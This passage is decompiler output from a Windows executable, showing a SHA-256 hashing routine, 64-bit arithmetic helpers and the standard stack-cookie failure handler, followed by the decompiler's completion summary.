    v4 = *((_QWORD *)a1 + 4) + 1i64;
    result = (unsigned int *)HIDWORD(v4);
    *((_QWORD *)a1 + 4) = v4;
    --a3;
    if ( v5 == 64 )
    {
      v5 = 0;
      result = sub_407150(a1);
    }
  }
  return result;
}

//----- (00405240) --------------------------------------------------------
_DWORD *__cdecl sub_405240(int a1, _BYTE *a2)
{
  int v2; // edx
  int v3; // edx
  unsigned __int64 v5; // [esp+0h] [ebp-10h]
  unsigned int j; // [esp+8h] [ebp-8h]
  unsigned int k; // [esp+8h] [ebp-8h]
  int v8; // [esp+Ch] [ebp-4h]
  int i; // [esp+Ch] [ebp-4h]
  int v10; // [esp+Ch] [ebp-4h]
  _BYTE *v11; // [esp+1Ch] [ebp+Ch]

  LODWORD(v5) = sub_407320(*(_QWORD *)(a1 + 32), 3u);
  HIDWORD(v5) = v2;
  v8 = *(_DWORD *)(a1 + 32) & 0x3F;
  *(_BYTE *)(v8 + a1 + 40) = 0x80;
  for ( i = v8 + 1; i != 56; i = v10 + 1 )
  {
    v10 = i & 0x3F;
    if ( !v10 )
      sub_407150((unsigned int *)a1);
    *(_BYTE *)(v10 + a1 + 40) = 0;
  }
  for ( j = 0; j < 8; ++j )
  {
    *(_BYTE *)(i + a1 + 40) = sub_407340(v5, 0x38u);
    ++i;
    LODWORD(v5) = sub_407320(v5, 8u);
    HIDWORD(v5) = v3;
  }
  sub_407150((unsigned int *)a1);
  for ( k = 0; k < 8; ++k )
  {
    *a2 = HIBYTE(*(_DWORD *)(a1 + 4 * k));
    v11 = a2 + 1;
    *v11++ = BYTE2(*(_DWORD *)(a1 + 4 * k));
    *v11 = BYTE1(*(_DWORD *)(a1 + 4 * k));
    v11[1] = *(_BYTE *)(a1 + 4 * k);
    a2 = v11 + 2;
  }
  return sub_405110((_DWORD *)a1);
}
// 405259: variable 'v2' is possibly undefined
// 4052F4: variable 'v3' is possibly undefined

//----- (004053A0) --------------------------------------------------------
_DWORD *__cdecl sub_4053A0(_BYTE *a1, _BYTE *a2, int a3)
{
  unsigned int v4[26]; // [esp+0h] [ebp-6Ch] BYREF

  sub_405110(v4);
  sub_4051C0(v4, a2, a3);
  return sub_405240((int)v4, a1);
}
// 4053A0: using guessed type unsigned int var_6C[26];

//----- (004053F0) --------------------------------------------------------
unsigned int *__cdecl sub_4053F0(unsigned int *a1, unsigned int *a2)
{
  unsigned int *result; // eax
  unsigned int v3; // [esp+88h] [ebp-64h]
  unsigned int v4; // [esp+8Ch] [ebp-60h]
  unsigned int v5; // [esp+90h] [ebp-5Ch]
  unsigned int v6; // [esp+94h] [ebp-58h]
  unsigned int v7; // [esp+98h] [ebp-54h]
  unsigned int v8; // [esp+9Ch] [ebp-50h]
  unsigned int v9; // [esp+A0h] [ebp-4Ch]
  unsigned int v10; // [esp+A4h] [ebp-48h]
  unsigned int v11; // [esp+A8h] [ebp-44h]
  unsigned int v12; // [esp+ACh] [ebp-40h]
  unsigned int v13; // [esp+B0h] [ebp-3Ch]
  unsigned int v14; // [esp+B4h] [ebp-38h]
  unsigned int v15; // [esp+B8h] [ebp-34h]
  unsigned int v16; // [esp+BCh] [ebp-30h]
  unsigned int v17; // [esp+C0h] [ebp-2Ch]
  unsigned int v18; // [esp+C4h] [ebp-28h]
  unsigned int i; // [esp+C8h] [ebp-24h]
  unsigned int v20; // [esp+CCh] [ebp-20h]
  unsigned int v21; // [esp+CCh] [ebp-20h]
  unsigned int v22; // [esp+CCh] [ebp-20h]
  unsigned int v23; // [esp+CCh] [ebp-20h]
  unsigned int v24; // [esp+CCh] [ebp-20h]
  unsigned int v25; // [esp+CCh] [ebp-20h]
  unsigned int v26; // [esp+D0h] [ebp-1Ch]
  unsigned int v27; // [esp+D0h] [ebp-1Ch]
  unsigned int v28; // [esp+D0h] [ebp-1Ch]
  unsigned int v29; // [esp+D0h] [ebp-1Ch]
  unsigned int v30; // [esp+D0h] [ebp-1Ch]
  unsigned int v31; // [esp+D0h] [ebp-1Ch]
  unsigned int v32; // [esp+D4h] [ebp-18h]
  unsigned int v33; // [esp+D4h] [ebp-18h]
  unsigned int v34; // [esp+D4h] [ebp-18h]
  unsigned int v35; // [esp+D4h] [ebp-18h]
  unsigned int v36; // [esp+D4h] [ebp-18h]
  unsigned int v37; // [esp+D4h] [ebp-18h]
  unsigned int v38; // [esp+D8h] [ebp-14h]
  unsigned int v39; // [esp+D8h] [ebp-14h]
  unsigned int v40; // [esp+D8h] [ebp-14h]
  unsigned int v41; // [esp+D8h] [ebp-14h]
  unsigned int v42; // [esp+D8h] [ebp-14h]
  unsigned int v43; // [esp+D8h] [ebp-14h]
  unsigned int v44; // [esp+DCh] [ebp-10h]
  unsigned int v45; // [esp+DCh] [ebp-10h]
  unsigned int v46; // [esp+DCh] [ebp-10h]
  unsigned int v47; // [esp+DCh] [ebp-10h]
  unsigned int v48; // [esp+DCh] [ebp-10h]
  unsigned int v49; // [esp+DCh] [ebp-10h]
  unsigned int v50; // [esp+E0h] [ebp-Ch]
  unsigned int v51; // [esp+E0h] [ebp-Ch]
  unsigned int v52; // [esp+E0h] [ebp-Ch]
  unsigned int v53; // [esp+E0h] [ebp-Ch]
  unsigned int v54; // [esp+E0h] [ebp-Ch]
  unsigned int v55; // [esp+E0h] [ebp-Ch]
  unsigned int v56; // [esp+E4h] [ebp-8h]
  unsigned int v57; // [esp+E4h] [ebp-8h]
  unsigned int v58; // [esp+E4h] [ebp-8h]
  unsigned int v59; // [esp+E4h] [ebp-8h]
  unsigned int v60; // [esp+E4h] [ebp-8h]
  unsigned int v61; // [esp+E4h] [ebp-8h]
  unsigned int v62; // [esp+E8h] [ebp-4h]
  unsigned int v63; // [esp+E8h] [ebp-4h]
  unsigned int v64; // [esp+E8h] [ebp-4h]
  unsigned int v65; // [esp+E8h] [ebp-4h]
  unsigned int v66; // [esp+E8h] [ebp-4h]
  unsigned int v67; // [esp+E8h] [ebp-4h]

  v62 = *a1;
  v56 = a1[1];
  v50 = a1[2];
  v44 = a1[3];
  v38 = a1[4];
  v32 = a1[5];
  v26 = a1[6];
  v20 = a1[7];
  for ( i = 0; i < 0x40; i += 16 )
  {
    if ( i )
      v3 += ((v4 >> 3) ^ ((v4 >> 18) | (v4 << 14)) ^ ((v4 >> 7) | (v4 << 25)))
          + v12
          + ((v17 >> 10) ^ ((v17 >> 19) | (v17 << 13)) ^ ((v17 >> 17) | (v17 << 15)));
    else
      v3 = *a2;
    v21 = v20
        + v3
        + dword_4022C8[i]
        + (v26 ^ v38 & (v26 ^ v32))
        + (((v38 >> 25) | (v38 << 7)) ^ ((v38 >> 11) | (v38 << 21)) ^ ((v38 >> 6) | (v38 << 26)));
    v45 = v21 + v44;
    v22 = (((v62 >> 22) | (v62 << 10)) ^ ((v62 >> 13) | (v62 << 19)) ^ ((v62 >> 2) | (v62 << 30)))
        + v21
        + (v50 & (v56 | v62) | v56 & v62);
    if ( i )
      v4 += ((v5 >> 3) ^ ((v5 >> 18) | (v5 << 14)) ^ ((v5 >> 7) | (v5 << 25)))
          + v13
          + ((v18 >> 10) ^ ((v18 >> 19) | (v18 << 13)) ^ ((v18 >> 17) | (v18 << 15)));
    else
      v4 = a2[1];
    v27 = v26
        + v4
        + dword_4022CC[i]
        + (v32 ^ v45 & (v32 ^ v38))
        + (((v45 >> 25) | (v45 << 7)) ^ ((v45 >> 11) | (v45 << 21)) ^ ((v45 >> 6) | (v45 << 26)));
    v51 = v27 + v50;
    v28 = (((v22 >> 22) | (v22 << 10)) ^ ((v22 >> 13) | (v22 << 19)) ^ ((v22 >> 2) | (v22 << 30)))
        + v27
        + (v56 & (v62 | v22) | v62 & v22);
    if ( i )
      v5 += ((v6 >> 3) ^ ((v6 >> 18) | (v6 << 14)) ^ ((v6 >> 7) | (v6 << 25)))
          + v14
          + ((v3 >> 10) ^ ((v3 >> 19) | (v3 << 13)) ^ ((v3 >> 17) | (v3 << 15)));
    else
      v5 = a2[2];
    v33 = v32
        + v5
        + dword_4022D0[i]
        + (v38 ^ v51 & (v38 ^ v45))
        + (((v51 >> 25) | (v51 << 7)) ^ ((v51 >> 11) | (v51 << 21)) ^ ((v51 >> 6) | (v51 << 26)));
    v57 = v33 + v56;
    v34 = (((v28 >> 22) | (v28 << 10)) ^ ((v28 >> 13) | (v28 << 19)) ^ ((v28 >> 2) | (v28 << 30)))
        + v33
        + (v62 & (v22 | v28) | v22 & v28);
    if ( i )
      v6 += ((v7 >> 3) ^ ((v7 >> 18) | (v7 << 14)) ^ ((v7 >> 7) | (v7 << 25)))
          + v15
          + ((v4 >> 10) ^ ((v4 >> 19) | (v4 << 13)) ^ ((v4 >> 17) | (v4 << 15)));
    else
      v6 = a2[3];
    v39 = v38
        + v6
        + dword_4022D4[i]
        + (v45 ^ v57 & (v45 ^ v51))
        + (((v57 >> 25) | (v57 << 7)) ^ ((v57 >> 11) | (v57 << 21)) ^ ((v57 >> 6) | (v57 << 26)));
    v63 = v39 + v62;
    v40 = (((v34 >> 22) | (v34 << 10)) ^ ((v34 >> 13) | (v34 << 19)) ^ ((v34 >> 2) | (v34 << 30)))
        + v39
        + (v22 & (v28 | v34) | v28 & v34);
    if ( i )
      v7 += ((v8 >> 3) ^ ((v8 >> 18) | (v8 << 14)) ^ ((v8 >> 7) | (v8 << 25)))
          + v16
          + ((v5 >> 10) ^ ((v5 >> 19) | (v5 << 13)) ^ ((v5 >> 17) | (v5 << 15)));
    else
      v7 = a2[4];
    v46 = v45
        + v7
        + dword_4022D8[i]
        + (v51 ^ v63 & (v51 ^ v57))
        + (((v63 >> 25) | (v63 << 7)) ^ ((v63 >> 11) | (v63 << 21)) ^ ((v63 >> 6) | (v63 << 26)));
    v23 = v46 + v22;
    v47 = (((v40 >> 22) | (v40 << 10)) ^ ((v40 >> 13) | (v40 << 19)) ^ ((v40 >> 2) | (v40 << 30)))
        + v46
        + (v28 & (v34 | v40) | v34 & v40);
    if ( i )
      v8 += ((v9 >> 3) ^ ((v9 >> 18) | (v9 << 14)) ^ ((v9 >> 7) | (v9 << 25)))
          + v17
          + ((v6 >> 10) ^ ((v6 >> 19) | (v6 << 13)) ^ ((v6 >> 17) | (v6 << 15)));
    else
      v8 = a2[5];
    v52 = v51
        + v8
        + dword_4022DC[i]
        + (v57 ^ v23 & (v57 ^ v63))
        + (((v23 >> 25) | (v23 << 7)) ^ ((v23 >> 11) | (v23 << 21)) ^ ((v23 >> 6) | (v23 << 26)));
    v29 = v52 + v28;
    v53 = (((v47 >> 22) | (v47 << 10)) ^ ((v47 >> 13) | (v47 << 19)) ^ ((v47 >> 2) | (v47 << 30)))
        + v52
        + (v34 & (v40 | v47) | v40 & v47);
    if ( i )
      v9 += ((v10 >> 3) ^ ((v10 >> 18) | (v10 << 14)) ^ ((v10 >> 7) | (v10 << 25)))
          + v18
          + ((v7 >> 10) ^ ((v7 >> 19) | (v7 << 13)) ^ ((v7 >> 17) | (v7 << 15)));
    else
      v9 = a2[6];
    v58 = v57
        + v9
        + dword_4022E0[i]
        + (v63 ^ v29 & (v63 ^ v23))
        + (((v29 >> 25) | (v29 << 7)) ^ ((v29 >> 11) | (v29 << 21)) ^ ((v29 >> 6) | (v29 << 26)));
    v35 = v58 + v34;
    v59 = (((v53 >> 22) | (v53 << 10)) ^ ((v53 >> 13) | (v53 << 19)) ^ ((v53 >> 2) | (v53 << 30)))
        + v58
        + (v40 & (v47 | v53) | v47 & v53);
    if ( i )
      v10 += ((v11 >> 3) ^ ((v11 >> 18) | (v11 << 14)) ^ ((v11 >> 7) | (v11 << 25)))
           + v3
           + ((v8 >> 10) ^ ((v8 >> 19) | (v8 << 13)) ^ ((v8 >> 17) | (v8 << 15)));
    else
      v10 = a2[7];
    v64 = v63
        + v10
        + dword_4022E4[i]
        + (v23 ^ v35 & (v23 ^ v29))
        + (((v35 >> 25) | (v35 << 7)) ^ ((v35 >> 11) | (v35 << 21)) ^ ((v35 >> 6) | (v35 << 26)));
    v41 = v64 + v40;
    v65 = (((v59 >> 22) | (v59 << 10)) ^ ((v59 >> 13) | (v59 << 19)) ^ ((v59 >> 2) | (v59 << 30)))
        + v64
        + (v47 & (v53 | v59) | v53 & v59);
    if ( i )
      v11 += ((v12 >> 3) ^ ((v12 >> 18) | (v12 << 14)) ^ ((v12 >> 7) | (v12 << 25)))
           + v4
           + ((v9 >> 10) ^ ((v9 >> 19) | (v9 << 13)) ^ ((v9 >> 17) | (v9 << 15)));
    else
      v11 = a2[8];
    v24 = v23
        + v11
        + dword_4022E8[i]
        + (v29 ^ v41 & (v29 ^ v35))
        + (((v41 >> 25) | (v41 << 7)) ^ ((v41 >> 11) | (v41 << 21)) ^ ((v41 >> 6) | (v41 << 26)));
    v48 = v24 + v47;
    v25 = (((v65 >> 22) | (v65 << 10)) ^ ((v65 >> 13) | (v65 << 19)) ^ ((v65 >> 2) | (v65 << 30)))
        + v24
        + (v53 & (v59 | v65) | v59 & v65);
    if ( i )
      v12 += ((v13 >> 3) ^ ((v13 >> 18) | (v13 << 14)) ^ ((v13 >> 7) | (v13 << 25)))
           + v5
           + ((v10 >> 10) ^ ((v10 >> 19) | (v10 << 13)) ^ ((v10 >> 17) | (v10 << 15)));
    else
      v12 = a2[9];
    v30 = v29
        + v12
        + dword_4022EC[i]
        + (v35 ^ v48 & (v35 ^ v41))
        + (((v48 >> 25) | (v48 << 7)) ^ ((v48 >> 11) | (v48 << 21)) ^ ((v48 >> 6) | (v48 << 26)));
    v54 = v30 + v53;
    v31 = (((v25 >> 22) | (v25 << 10)) ^ ((v25 >> 13) | (v25 << 19)) ^ ((v25 >> 2) | (v25 << 30)))
        + v30
        + (v59 & (v65 | v25) | v65 & v25);
    if ( i )
      v13 += ((v14 >> 3) ^ ((v14 >> 18) | (v14 << 14)) ^ ((v14 >> 7) | (v14 << 25)))
           + v6
           + ((v11 >> 10) ^ ((v11 >> 19) | (v11 << 13)) ^ ((v11 >> 17) | (v11 << 15)));
    else
      v13 = a2[10];
    v36 = v35
        + v13
        + dword_4022F0[i]
        + (v41 ^ v54 & (v41 ^ v48))
        + (((v54 >> 25) | (v54 << 7)) ^ ((v54 >> 11) | (v54 << 21)) ^ ((v54 >> 6) | (v54 << 26)));
    v60 = v36 + v59;
    v37 = (((v31 >> 22) | (v31 << 10)) ^ ((v31 >> 13) | (v31 << 19)) ^ ((v31 >> 2) | (v31 << 30)))
        + v36
        + (v65 & (v25 | v31) | v25 & v31);
    if ( i )
      v14 += ((v15 >> 3) ^ ((v15 >> 18) | (v15 << 14)) ^ ((v15 >> 7) | (v15 << 25)))
           + v7
           + ((v12 >> 10) ^ ((v12 >> 19) | (v12 << 13)) ^ ((v12 >> 17) | (v12 << 15)));
    else
      v14 = a2[11];
    v42 = v41
        + v14
        + dword_4022F4[i]
        + (v48 ^ v60 & (v48 ^ v54))
        + (((v60 >> 25) | (v60 << 7)) ^ ((v60 >> 11) | (v60 << 21)) ^ ((v60 >> 6) | (v60 << 26)));
    v66 = v42 + v65;
    v43 = (((v37 >> 22) | (v37 << 10)) ^ ((v37 >> 13) | (v37 << 19)) ^ ((v37 >> 2) | (v37 << 30)))
        + v42
        + (v25 & (v31 | v37) | v31 & v37);
    if ( i )
      v15 += ((v16 >> 3) ^ ((v16 >> 18) | (v16 << 14)) ^ ((v16 >> 7) | (v16 << 25)))
           + v8
           + ((v13 >> 10) ^ ((v13 >> 19) | (v13 << 13)) ^ ((v13 >> 17) | (v13 << 15)));
    else
      v15 = a2[12];
    v49 = v48
        + v15
        + dword_4022F8[i]
        + (v54 ^ v66 & (v54 ^ v60))
        + (((v66 >> 25) | (v66 << 7)) ^ ((v66 >> 11) | (v66 << 21)) ^ ((v66 >> 6) | (v66 << 26)));
    v20 = v49 + v25;
    v44 = (((v43 >> 22) | (v43 << 10)) ^ ((v43 >> 13) | (v43 << 19)) ^ ((v43 >> 2) | (v43 << 30)))
        + v49
        + (v31 & (v37 | v43) | v37 & v43);
    if ( i )
      v16 += ((v17 >> 3) ^ ((v17 >> 18) | (v17 << 14)) ^ ((v17 >> 7) | (v17 << 25)))
           + v9
           + ((v14 >> 10) ^ ((v14 >> 19) | (v14 << 13)) ^ ((v14 >> 17) | (v14 << 15)));
    else
      v16 = a2[13];
    v55 = v54
        + v16
        + dword_4022FC[i]
        + (v60 ^ v20 & (v60 ^ v66))
        + (((v20 >> 25) | (v20 << 7)) ^ ((v20 >> 11) | (v20 << 21)) ^ ((v20 >> 6) | (v20 << 26)));
    v26 = v55 + v31;
    v50 = (((v44 >> 22) | (v44 << 10)) ^ ((v44 >> 13) | (v44 << 19)) ^ ((v44 >> 2) | (v44 << 30)))
        + v55
        + (v37 & (v43 | v44) | v43 & v44);
    if ( i )
      v17 += ((v18 >> 3) ^ ((v18 >> 18) | (v18 << 14)) ^ ((v18 >> 7) | (v18 << 25)))
           + v10
           + ((v15 >> 10) ^ ((v15 >> 19) | (v15 << 13)) ^ ((v15 >> 17) | (v15 << 15)));
    else
      v17 = a2[14];
    v61 = v60
        + v17
        + dword_402300[i]
        + (v66 ^ v26 & (v66 ^ v20))
        + (((v26 >> 25) | (v26 << 7)) ^ ((v26 >> 11) | (v26 << 21)) ^ ((v26 >> 6) | (v26 << 26)));
    v32 = v61 + v37;
    v56 = (((v50 >> 22) | (v50 << 10)) ^ ((v50 >> 13) | (v50 << 19)) ^ ((v50 >> 2) | (v50 << 30)))
        + v61
        + (v43 & (v44 | v50) | v44 & v50);
    if ( i )
      v18 += ((v3 >> 3) ^ ((v3 >> 18) | (v3 << 14)) ^ ((v3 >> 7) | (v3 << 25)))
           + v11
           + ((v16 >> 10) ^ ((v16 >> 19) | (v16 << 13)) ^ ((v16 >> 17) | (v16 << 15)));
    else
      v18 = a2[15];
    v67 = v66
        + v18
        + dword_402304[i]
        + (v20 ^ v32 & (v20 ^ v26))
        + (((v32 >> 25) | (v32 << 7)) ^ ((v32 >> 11) | (v32 << 21)) ^ ((v32 >> 6) | (v32 << 26)));
    v38 = v67 + v43;
    v62 = (((v56 >> 22) | (v56 << 10)) ^ ((v56 >> 13) | (v56 << 19)) ^ ((v56 >> 2) | (v56 << 30)))
        + v67
        + (v44 & (v50 | v56) | v50 & v56);
  }
  *a1 += v62;
  a1[1] += v56;
  a1[2] += v50;
  a1[3] += v44;
  a1[4] += v38;
  a1[5] += v32;
  a1[6] += v26;
  result = a1;
  a1[7] += v20;
  return result;
}
// 40555D: variable 'v4' is possibly undefined
// 40550B: variable 'v12' is possibly undefined
// 4054FE: variable 'v17' is possibly undefined
// 40557E: variable 'v3' is possibly undefined
// 40570F: variable 'v5' is possibly undefined
// 4056C2: variable 'v13' is possibly undefined
// 4056B5: variable 'v18' is possibly undefined
// 4058BC: variable 'v6' is possibly undefined
// 40586A: variable 'v14' is possibly undefined
// 405A66: variable 'v7' is possibly undefined
// 405A14: variable 'v15' is possibly undefined
// 405C0F: variable 'v8' is possibly undefined
// 405BBD: variable 'v16' is possibly undefined
// 405DCF: variable 'v9' is possibly undefined
// 405F8F: variable 'v10' is possibly undefined
// 40614F: variable 'v11' is possibly undefined
// 4022C8: using guessed type int dword_4022C8[];
// 4022CC: using guessed type int dword_4022CC[];
// 4022D0: using guessed type int dword_4022D0[];
// 4022D4: using guessed type int dword_4022D4[];
// 4022D8: using guessed type int dword_4022D8[];
// 4022DC: using guessed type int dword_4022DC[];
// 4022E0: using guessed type int dword_4022E0[];
// 4022E4: using guessed type int dword_4022E4[];
// 4022E8: using guessed type int dword_4022E8[];
// 4022EC: using guessed type int dword_4022EC[];
// 4022F0: using guessed type int dword_4022F0[];
// 4022F4: using guessed type int dword_4022F4[];
// 4022F8: using guessed type int dword_4022F8[];
// 4022FC: using guessed type int dword_4022FC[];
// 402300: using guessed type int dword_402300[];
// 402304: using guessed type int dword_402304[];

//----- (00407150) --------------------------------------------------------
unsigned int *__cdecl sub_407150(unsigned int *a1)
{
  unsigned int i; // [esp+0h] [ebp-48h]
  unsigned int v3[16]; // [esp+4h] [ebp-44h] BYREF

  for ( i = 0; i < 0x10; ++i )
    v3[i] = HIBYTE(a1[i + 10]) + (BYTE2(a1[i + 10]) << 8) + (BYTE1(a1[i + 10]) << 16) + (LOBYTE(a1[i + 10]) << 24);
  return sub_4053F0(a1, v3);
}
// 407150: using guessed type unsigned int var_44[16];

//----- (00407200) --------------------------------------------------------
int __stdcall sub_407200(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    LODWORD(v5) = v4 / (unsigned int)a2;
    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

//----- (004072B0) --------------------------------------------------------
unsigned __int64 __stdcall sub_4072B0(__int64 a1, __int64 a2)
{
  if ( HIDWORD(a1) | HIDWORD(a2) )
    return a1 * a2;
  else
    return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;
}

//----- (00407320) --------------------------------------------------------
int __usercall sub_407320@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  __int64 v2; // rax

  if ( a2 >= 0x40u )
  {
    LODWORD(v2) = 0;
  }
  else if ( a2 >= 0x20u )
  {
    LODWORD(v2) = 0;
  }
  else
  {
    return a1 << (a2 & 0x1F);
  }
  return v2;
}

//----- (00407340) --------------------------------------------------------
unsigned __int64 __usercall sub_407340@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  if ( a2 >= 0x40u )
    return 0i64;
  else
    return a1 >> a2;
}

//----- (0040735F) --------------------------------------------------------
BOOL __cdecl sub_40735F(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  HANDLE CurrentProcess; // eax

  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter(ExceptionInfo);
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000409);
}

//----- (00407387) --------------------------------------------------------
BOOL __usercall sub_407387@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char a4)
{
  int v4; // edx
  int v5; // ecx
  unsigned int v6; // kr00_4
  int vars0; // [esp+324h] [ebp+0h]
  int retaddr; // [esp+328h] [ebp+4h]

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(2u);
  dword_408500 = 0;
  dword_4084FC = v5;
  dword_4084F8 = v4;
  dword_4084F4 = a1;
  dword_4084F0 = a3;
  dword_4084EC = a2;
  word_408518 = __SS__;
  word_40850C = __CS__;
  word_4084E8 = __DS__;
  word_4084E4 = __ES__;
  word_4084E0 = __FS__;
  word_4084DC = __GS__;
  v6 = __readeflags();
  dword_408510 = v6;
  dword_408504 = vars0;
  dword_408508 = retaddr;
  dword_408514 = (int)&a4;
  dword_408450 = 65537;
  dword_40840C = retaddr;
  dword_408400 = -1073740791;
  dword_408404 = 1;
  dword_408410 = 1;
  dword_408414 = 2;
  return sub_40735F((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
}
// 4073A5: variable 'v5' is possibly undefined
// 4073AB: variable 'v4' is possibly undefined
// 4073F7: variable 'vars0' is possibly undefined
// 408400: using guessed type int dword_408400;
// 408404: using guessed type int dword_408404;
// 40840C: using guessed type int dword_40840C;
// 408410: using guessed type int dword_408410;
// 408414: using guessed type int dword_408414;
// 408450: using guessed type int dword_408450;
// 4084DC: using guessed type __int16 word_4084DC;
// 4084E0: using guessed type __int16 word_4084E0;
// 4084E4: using guessed type __int16 word_4084E4;
// 4084E8: using guessed type __int16 word_4084E8;
// 4084EC: using guessed type int dword_4084EC;
// 4084F0: using guessed type int dword_4084F0;
// 4084F4: using guessed type int dword_4084F4;
// 4084F8: using guessed type int dword_4084F8;
// 4084FC: using guessed type int dword_4084FC;
// 408500: using guessed type int dword_408500;
// 408504: using guessed type int dword_408504;
// 408508: using guessed type int dword_408508;
// 40850C: using guessed type __int16 word_40850C;
// 408510: using guessed type int dword_408510;
// 408514: using guessed type int dword_408514;
// 408518: using guessed type __int16 word_408518;

// nfuncs=76 queued=61 decompiled=61 lumina nreq=0 worse=0 better=0
// ALL OK, 61 function(s) have been successfully decompiled
